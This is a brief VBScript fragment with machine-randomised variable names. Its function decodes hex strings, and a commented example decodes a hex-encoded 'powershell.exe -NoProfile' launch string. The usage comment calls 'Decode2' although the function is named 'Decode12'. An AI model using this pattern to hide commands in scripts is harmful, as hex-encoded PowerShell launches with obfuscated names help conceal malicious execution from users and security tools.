Function Decode12(h9_WfJfRkU)
    Dim r10_XWESyRm, i11_pefBElq, l12_OFTEJex
    l12_OFTEJex = Len(h9_WfJfRkU)
    i11_pefBElq = 1
    r10_XWESyRm = ""
    While i11_pefBElq <= l12_OFTEJex
        r10_XWESyRm = r10_XWESyRm & Chr(CLng("&H" & Mid(h9_WfJfRkU, i11_pefBElq, 2)))
        i11_pefBElq = i11_pefBElq + 2
    Wend
    Decode12 = r10_XWESyRm
End Function

'' Complete script usage:
'' Dim hexPayload
'' hexPayload = "706f7765727368656c6c2e657865202d4e6f50726f66696c65"
'' Dim result
'' result = Decode2(hexPayload)
'' WScript.Echo result
